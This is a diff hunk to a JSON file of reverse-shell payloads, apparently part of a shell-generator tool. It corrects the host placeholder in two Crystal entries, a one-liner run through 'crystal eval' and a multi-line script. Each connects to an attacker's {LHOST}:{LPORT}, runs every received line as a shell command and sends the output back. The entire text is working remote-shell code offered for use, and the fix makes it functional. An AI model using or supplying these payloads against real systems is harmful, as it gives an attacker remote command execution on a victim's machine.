@@ -54,11 +54,11 @@
         ],
         "crystal": [
             {
-                "command":"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{LPORT}\",{LPORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
+                "command":"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{LHOST}\",{LPORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
                 "comments":"crystal system"
             },
             {
-                "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{LPORT}\",{LPORT})\nloop do\n\t m, l = c.receive\n\tp = Process.new(m.rstrip(\"\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend",
+                "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{LHOST}\",{LPORT})\nloop do\n\t m, l = c.receive\n\tp = Process.new(m.rstrip(\"\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend",
                 "comments":"crystal code"
             }
         ],
